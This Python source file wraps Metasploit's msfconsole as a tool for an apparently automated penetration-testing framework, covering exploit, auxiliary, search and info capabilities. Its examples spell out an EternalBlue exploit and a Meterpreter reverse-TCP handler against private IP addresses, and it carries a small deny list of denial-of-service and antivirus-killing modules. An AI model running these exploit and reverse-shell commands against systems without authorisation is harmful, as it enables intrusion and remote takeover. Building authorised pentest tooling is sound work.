"""
Metasploit Framework console tool implementation.

This tool provides a non-interactive interface to msfconsole for
penetration testing workflows in the wish framework.
"""

import asyncio
import re
import subprocess
import time
from typing import Any, Dict, Optional

from wish_tools.framework.base import BaseTool, CommandInput, ToolCapability, ToolContext, ToolMetadata, ToolResult


class MsfconsoleTool(BaseTool):
    """Metasploit Framework console tool."""

    def _build_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="msfconsole",
            version="1.0.0",
            description="Metasploit Framework penetration testing tool",
            author="Wish Framework Team",
            category="exploitation",
            capabilities=[
                ToolCapability(
                    name="exploit",
                    description="Run an exploit module against target(s)",
                    parameters={
                        "module": "The exploit module path (e.g., exploit/windows/smb/ms17_010_eternalblue)",
                        "rhosts": "Target host(s) - IP address or range",
                        "rport": "Target port (optional, module default used if not specified)",
                        "payload": "Payload to use (optional, module default used if not specified)",
                        "lhost": "Local host for reverse connection (required for reverse payloads)",
                        "lport": "Local port for reverse connection (optional, default: 4444)",
                        "options": "Additional module options as key-value pairs (optional)",
                    },
                    examples=[
                        "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; "
                        "set LHOST 192.168.1.10; exploit",
                        "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; "
                        "set LHOST 192.168.1.10; exploit",
                    ],
                ),
                ToolCapability(
                    name="auxiliary",
                    description="Run an auxiliary module (scanners, fuzzers, etc.)",
                    parameters={
                        "module": "The auxiliary module path (e.g., auxiliary/scanner/smb/smb_version)",
                        "rhosts": "Target host(s) - IP address or range",
                        "rport": "Target port (optional)",
                        "options": "Additional module options as key-value pairs (optional)",
                    },
                    examples=[
                        "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run",
                        "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.100; set PORTS 1-1000; run",
                    ],
                ),
                ToolCapability(
                    name="search",
                    description="Search for modules by name, platform, or CVE",
                    parameters={
                        "query": "Search query (module name, CVE, platform, etc.)",
                        "type": "Module type filter (optional: exploit, auxiliary, post, payload)",
                    },
                    examples=[
                        "search type:exploit platform:windows smb",
                        "search cve:2017-0144",
                        "search apache struts",
                    ],
                ),
                ToolCapability(
                    name="info",
                    description="Get detailed information about a module",
                    parameters={"module": "Full module path to get information about"},
                    examples=[
                        "info exploit/windows/smb/ms17_010_eternalblue",
                        "info auxiliary/scanner/smb/smb_version",
                    ],
                ),
            ],
            requirements=["metasploit-framework"],
            tags=["exploitation", "pentesting", "vulnerability", "msf", "metasploit"],
        )

    async def validate_availability(self) -> tuple[bool, Optional[str]]:
        """Check if msfconsole is available."""
        try:
            result = subprocess.run(["msfconsole", "-v"], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                return True, None
            else:
                return False, "msfconsole returned non-zero exit code"
        except FileNotFoundError:
            return False, "msfconsole not found. Please install Metasploit Framework"
        except subprocess.TimeoutExpired:
            return False, "msfconsole version check timed out"
        except Exception as e:
            return False, f"Error checking msfconsole availability: {str(e)}"

    async def execute(self, command: CommandInput, context: ToolContext, **kwargs) -> ToolResult:
        """Execute msfconsole command in non-interactive mode."""
        start_time = time.time()

        try:
            # Prepare msfconsole command with proper formatting
            msf_command = self._prepare_msf_command(command.command)

            # Run msfconsole in non-interactive mode
            process = await asyncio.create_subprocess_exec(
                "msfconsole",
                "-q",
                "-x",
                msf_command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=context.working_directory,
            )

            # Set up timeout - exploits can take a while
            timeout = command.timeout_sec or context.timeout_override or 600

            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
            except asyncio.TimeoutError:
                process.kill()
                await process.wait()
                return ToolResult(
                    success=False,
                    output="",
                    error="msfconsole command timed out",
                    exit_code=124,
                    execution_time=timeout,
                    metadata={"timeout": True, "command": msf_command},
                )

            # Parse output
            output = stdout.decode("utf-8", errors="replace") if stdout else ""
            error = stderr.decode("utf-8", errors="replace") if stderr else ""

            # Determine success based on output content and exit code
            success = self._determine_success(output, error, process.returncode)

            # Extract metadata from output
            metadata = self._extract_msf_metadata(output)
            metadata.update(
                {"command": msf_command, "working_directory": context.working_directory, "run_id": context.run_id}
            )

            return ToolResult(
                success=success,
                output=output,
                error=error if error else None,
                exit_code=process.returncode or 0,
                execution_time=time.time() - start_time,
                metadata=metadata,
            )

        except Exception as e:
            return ToolResult(
                success=False,
                output="",
                error=f"msfconsole execution error: {str(e)}",
                exit_code=-1,
                execution_time=time.time() - start_time,
                metadata={"error_type": type(e).__name__},
            )

    def generate_command(
        self, capability: str, parameters: Dict[str, Any], context: Optional[ToolContext] = None
    ) -> CommandInput:
        """Generate msfconsole command for the specified capability."""
        if capability == "exploit":
            commands = [f"use {parameters['module']}"]

            # Set required parameters
            commands.append(f"set RHOSTS {parameters['rhosts']}")

            # Set optional parameters
            if "rport" in parameters:
                commands.append(f"set RPORT {parameters['rport']}")
            if "payload" in parameters:
                commands.append(f"set PAYLOAD {parameters['payload']}")
            if "lhost" in parameters:
                commands.append(f"set LHOST {parameters['lhost']}")
            if "lport" in parameters:
                commands.append(f"set LPORT {parameters['lport']}")

            # Set additional options
            if "options" in parameters:
                for key, value in parameters["options"].items():
                    commands.append(f"set {key.upper()} {value}")

            # Execute the exploit
            commands.append("exploit")

            return CommandInput(
                command="; ".join(commands),
                timeout_sec=600,  # Exploits may take time
            )

        elif capability == "auxiliary":
            commands = [f"use {parameters['module']}"]

            # Set required parameters
            if "rhosts" in parameters:
                commands.append(f"set RHOSTS {parameters['rhosts']}")

            # Set optional parameters
            if "rport" in parameters:
                commands.append(f"set RPORT {parameters['rport']}")

            # Set additional options
            if "options" in parameters:
                for key, value in parameters["options"].items():
                    commands.append(f"set {key.upper()} {value}")

            # Run the auxiliary module
            commands.append("run")

            return CommandInput(command="; ".join(commands), timeout_sec=300)

        elif capability == "search":
            query = parameters["query"]
            if "type" in parameters:
                query = f"type:{parameters['type']} {query}"

            return CommandInput(command=f"search {query}", timeout_sec=60)

        elif capability == "info":
            return CommandInput(command=f"info {parameters['module']}", timeout_sec=30)

        else:
            raise ValueError(f"Unknown capability: {capability}")

    def _prepare_msf_command(self, command: str) -> str:
        """Prepare command for msfconsole execution."""
        # Split commands and clean them up
        commands = [cmd.strip() for cmd in command.split(";") if cmd.strip()]

        # Ensure we exit cleanly (add if not present)
        if not any("exit" in cmd.lower() for cmd in commands):
            commands.append("exit -y")

        return "; ".join(commands)

    def _determine_success(self, output: str, error: str, exit_code: int) -> bool:
        """Determine if the msfconsole command was successful."""
        # Check exit code first
        if exit_code != 0:
            return False

        # Check for success indicators in output
        success_indicators = ["Session", "opened", "Auxiliary module execution completed", "Exploit completed"]

        # Check for failure indicators
        failure_indicators = [
            "Exploit failed",
            "Unable to connect",
            "Connection refused",
            "No route to host",
            "Module failed",
        ]

        output_lower = output.lower()

        # Check for explicit failures
        for indicator in failure_indicators:
            if indicator.lower() in output_lower:
                return False

        # Check for success indicators
        for indicator in success_indicators:
            if indicator.lower() in output_lower:
                return True

        # If no clear indicators, consider successful if no errors
        return not error or len(error.strip()) == 0

    def _extract_msf_metadata(self, output: str) -> Dict[str, Any]:
        """Extract metadata from msfconsole output."""
        metadata = {}

        # Extract session information
        session_match = re.search(r"Session (\d+) opened", output)
        if session_match:
            metadata["session_id"] = int(session_match.group(1))
            metadata["session_opened"] = True

        # Extract module information
        module_match = re.search(r"Module: ([\w/]+)", output)
        if module_match:
            metadata["module"] = module_match.group(1)

        # Extract target information
        target_match = re.search(r"RHOSTS\s*=>\s*([\d\.\,\s/]+)", output)
        if target_match:
            metadata["targets"] = target_match.group(1).strip()

        # Extract payload information
        payload_match = re.search(r"PAYLOAD\s*=>\s*([\w/]+)", output)
        if payload_match:
            metadata["payload"] = payload_match.group(1)

        # Count found modules (for search results)
        module_count_match = re.search(r"(\d+)\s+matching modules", output)
        if module_count_match:
            metadata["matching_modules"] = int(module_count_match.group(1))

        # Extract vulnerabilities found (for auxiliary modules)
        if "appears to be vulnerable" in output.lower():
            metadata["vulnerable"] = True

        return metadata

    def validate_command(self, command: CommandInput) -> tuple[bool, Optional[str]]:
        """Validate msfconsole command."""
        cmd = command.command.strip().lower()

        # Check for required msfconsole commands
        valid_commands = ["use", "set", "exploit", "run", "search", "info", "exit"]

        # Split into individual commands
        commands = [c.strip() for c in cmd.split(";") if c.strip()]

        for command_part in commands:
            # Check if command starts with a valid msfconsole command
            if not any(command_part.startswith(valid_cmd) for valid_cmd in valid_commands):
                return False, f"Invalid msfconsole command: {command_part}"

        # Check for dangerous module usage (optional safety check)
        dangerous_modules = [
            "auxiliary/dos/",  # Denial of service modules
            "post/windows/manage/killav",  # Antivirus killing
        ]

        for dangerous in dangerous_modules:
            if dangerous in cmd:
                return False, f"Potentially dangerous module detected: {dangerous}"

        return True, None
